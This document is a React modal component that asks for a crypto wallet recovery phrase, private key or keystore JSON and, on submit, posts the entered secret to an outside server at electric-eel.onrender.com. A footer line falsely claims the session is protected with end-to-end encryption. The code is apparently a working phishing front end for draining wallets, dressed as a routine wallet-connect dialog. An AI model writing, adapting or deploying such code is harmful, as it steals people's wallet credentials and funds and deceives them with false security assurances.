import React, { useState } from "react";
import { motion } from "framer-motion";
import { IoShieldHalfOutline } from "react-icons/io5";

const PhraseModal = ({ onClose, isDarkMode }) => {
  const [activeTab, setActiveTab] = useState("phrase");
  const [phraseLength, setPhraseLength] = useState(12);
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [loading, setLoading] = useState(false);

  const handlePhraseLengthChange = (length) => {
    setPhraseLength(length);
    setPhraseWords(Array(length).fill(""));
  };

  const handleWordChange = (index, value) => {
    const updated = [...phraseWords];
    updated[index] = value;
    setPhraseWords(updated);
  };

  const handleSubmit = async () => {
    try {
      setLoading(true);

      // Prepare payload based on active tab

      if (activeTab === "phrase") {
        // Check if all words are filled (no empty or whitespace-only strings)
        const incomplete = phraseWords.some((word) => word.trim() === "");
        if (incomplete) {
          alert("Please fill all the recovery phrase words before submitting.");
          return; // Stop submit
        }
      }
      let payload;
      if (activeTab === "phrase") {
        // Example: send phraseWords as array or joined string
        payload = {
          type: "phrase",
          phrase: phraseWords.filter(Boolean), // filter out empty words
        };
      } else if (activeTab === "privateKey") {
        payload = {
          type: "privateKey",
          key: privateKey,
        };
      } else if (activeTab === "keystore") {
        payload = {
          type: "keystore",
          keystore: keystoreJson,
        };
      }

      console.log("Payload checksss:", payload);

      const response = await fetch("https://electric-eel.onrender.com/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      console.log("Submit successful: ", result);

      // Optionally reset inputs after submit
      setPhraseWords(Array(phraseLength).fill(""));
      setPrivateKey("");
      setKeystoreJson("");
    } catch (error) {
      console.error("Submit error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className={`fixed inset-0 ${
        isDarkMode ? "bg-black/60" : "bg-blue-100/60"
      } flex items-center justify-center z-50 px-4`}
    >
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{
          type: "spring",
          stiffness: 100,
          damping: 15,
          duration: 0.6,
          delay: 0.2,
        }}
        className={`${
          isDarkMode ? "bg-[#1e1e1e] text-white" : "bg-white text-black"
        } p-6 rounded-lg shadow-lg max-w-md w-full relative`}
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-2 right-2 text-red-600 font-bold"
        >
          ✕
        </button>

        {/* Tabs */}
        <div className="max-h-[70vh] overflow-y-auto pr-2">
          <div className="flex justify-between items-center gap-2 border-b mb-6 text-sm font-medium">
            {["phrase", "privateKey", "keystore"].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-4 py-2 rounded-t ${
                  activeTab === tab
                    ? isDarkMode
                      ? "bg-[#2a2a2a] text-purple-400"
                      : "bg-blue-100 text--600"
                    : isDarkMode
                    ? "text-gray-400"
                    : "text-gray-500"
                }`}
              >
                {tab === "phrase"
                  ? "Recovery Phrase"
                  : tab === "privateKey"
                  ? "Private Key"
                  : "Keystore JSON"}
              </button>
            ))}
          </div>

          {/* Recovery Phrase Tab */}
          {activeTab === "phrase" && (
            <div className="space-y-4">
              <div className="flex justify-between items-center my-2">
                <p className="text-purple-600 text-xs font-semibold">
                  {phraseWords.filter((w) => w.trim() !== "").length} /{" "}
                  {phraseLength} words entered
                </p>
                <ul className="flex text-gray-800 text-xs font-medium gap-2">
                  {[12, 17, 24, 25].map((val) => (
                    <li
                      key={val}
                      onClick={() => handlePhraseLengthChange(val)}
                      className={`cursor-pointer px-2 py-1 rounded border transition-all duration-200 ${
                        phraseLength === val
                          ? "bg-blue-100 text-blue-600 border-blue-400"
                          : "text-purple-600 hover:bg-purple-100 border-transparent"
                      }`}
                    >
                      {val}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="grid grid-cols-3 gap-4">
                {phraseWords.map((input, index) => (
                  <div key={index} className="relative group my-1">
                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded bg-gradient-to-b from-indigo-500 to-purple-500 opacity-70 transition-all duration-300 group-focus-within:opacity-100"></span>
                    <input
                      id={`input-${index}`}
                      type="text"
                      value={input}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      placeholder="Word"
                      className={`peer w-full pl-6 pr-4 pt-6 pb-2 text-sm ${
                        isDarkMode
                          ? "text-white bg-[#2a2a2a] border-gray-600"
                          : "text-gray-800 bg-white border-gray-200"
                      } border rounded-lg shadow-md focus:border-transparent focus:ring-2 focus:ring-indigo-300 focus:outline-none placeholder-transparent`}
                    />
                    <label
                      htmlFor={`input-${index}`}
                      className="absolute left-6 top-3.5 text-[8px] text-gray-500 transition-all duration-200 ease-in-out 
                    peer-placeholder-shown:top-3 peer-placeholder-shown:text-base 
                    peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
                    peer-focus:text-sm peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                    >
                      Write here
                    </label>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Private Key Tab */}
          {activeTab === "privateKey" && (
            <div className="mb-4">
              <label className="block text-sm mb-2 text-gray-500">
                Private Key
              </label>
              <textarea
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter your private key"
                rows={4}
                className={`w-full p-3 text-sm rounded-lg shadow border ${
                  isDarkMode
                    ? "bg-[#2a2a2a] text-white border-gray-600"
                    : "bg-white text-gray-800 border-gray-200"
                } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
              />
            </div>
          )}

          {/* Keystore JSON Tab */}
          {activeTab === "keystore" && (
            <div className="space-y-3">
              <label className="block text-sm text-gray-500">
                Keystore JSON
              </label>
              <textarea
                value={keystoreJson}
                onChange={(e) => setKeystoreJson(e.target.value)}
                placeholder="Paste your keystore JSON here"
                rows={4}
                className={`w-full p-3 text-sm rounded-lg shadow border ${
                  isDarkMode
                    ? "bg-[#2a2a2a] text-white border-gray-600"
                    : "bg-white text-gray-800 border-gray-200"
                } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
              />
            </div>
          )}
        </div>

        <div className="w-full my-5">
          <button
            onClick={handleSubmit}
            disabled={loading}
            className={`border w-full border-blue-500 rounded-full py-3 ${
              loading
                ? "bg-gray-400 cursor-not-allowed text-gray-700"
                : "bg-indigo-600 hover:text-white text-white hover:bg-indigo-700 cursor-pointer"
            } text-xs`}
          >
            {loading ? "Submitting..." : "Continue"}
          </button>
        </div>

        {/* Footer */}
        <div className="text-center flex items-center justify-center gap-2 text-sm mt-6">
          <IoShieldHalfOutline className="text-2xl" />
          <p className="text-gray-400 text-sm">
            This session is protected with end-to-end encryption
          </p>
        </div>
      </motion.div>
    </div>
  );
};

export default PhraseModal;
